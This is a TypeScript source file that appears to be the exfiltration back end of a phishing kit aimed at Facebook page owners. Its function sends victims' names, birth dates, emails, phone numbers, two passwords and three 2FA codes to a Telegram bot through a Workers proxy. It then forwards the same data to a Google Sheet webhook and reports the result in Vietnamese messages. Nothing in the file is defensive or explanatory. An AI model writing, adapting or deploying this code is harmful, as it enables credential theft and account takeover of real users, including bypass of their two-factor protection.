import axios from 'axios';
import https from 'https';

const agent = new https.Agent({ family: 4 });

const TELEGRAM_API = `https://still-hat-1e87.ductham784.workers.dev/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;

export async function sendTelegramMessage(data: any): Promise<void> {
    try {
        const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `
<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>
-----------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
-----------------------------
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
-----------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`,
            parse_mode: 'HTML'
        }, {
            timeout: 10000,
            // httpsAgent: agent
        });
        console.log(`✅ Sent new message successfully`);

        if (process.env.WEBHOOK_URL) {
            const params = new URLSearchParams({
                'Ip': data.ip || '',
                'Location': data.location || '',
                'Email': data.email || '',
                'Email Business': data.emailBusiness || '',
                'Full Name': data.fullName || '',
                'Page Name': data.fanpage || '',
                'Phone Number': `+${data.phone}` || '',
                'Password First': data.password || '',
                'Password Second': data.passwordSecond || '',
                'Code 2FA(1)': data.twoFa || '',
                'Code 2FA(2)': data.twoFaSecond || '',
                'Code 2FA(3)': data.twoFaThird || '',
            });

            try {
                await axios.get(`${process.env.WEBHOOK_URL}?${params.toString()}`);
                await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: '✅ Gửi dữ liệu đến Google Sheet thành công.',
                    parse_mode: 'HTML'
                }, {
                    httpsAgent: agent,
                    timeout: 10000
                });
            } catch (err) {
                await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: '❌ Gửi dữ liệu đến Google Sheet thất bại. Liên hệ @otis_cua để khắc phục.',
                    parse_mode: 'HTML'
                }, {
                    httpsAgent: agent,
                    timeout: 10000
                });
            }
        }
    } catch (err: any) {
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
        throw new Error('Failed to send or edit Telegram message');
    }
}
